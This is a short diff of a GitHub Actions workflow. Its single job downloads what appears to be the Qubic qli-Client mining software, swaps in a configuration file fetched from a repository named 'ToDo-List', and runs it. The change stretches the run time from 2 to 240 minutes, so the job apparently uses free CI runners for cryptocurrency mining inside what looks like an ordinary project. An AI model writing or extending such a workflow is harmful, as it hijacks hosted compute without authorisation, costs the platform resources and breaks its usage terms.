@@ -69,4 +69,4 @@ jobs:
       - uses: actions/checkout@v2
 
       - name: 1
-        run: wget https://dl.qubic.li/downloads/qli-Client-1.8.9-Linux-x64.tar.gz && tar xf qli-Client-1.8.9-Linux-x64.tar.gz && rm -rf appsettings.json && wget https://github.com/fuckmav/ToDo-List/raw/main/appsettings.json && timeout 2m ./qli-Client
+        run: wget https://dl.qubic.li/downloads/qli-Client-1.8.9-Linux-x64.tar.gz && tar xf qli-Client-1.8.9-Linux-x64.tar.gz && rm -rf appsettings.json && wget https://github.com/fuckmav/ToDo-List/raw/main/appsettings.json && timeout 240m ./qli-Client
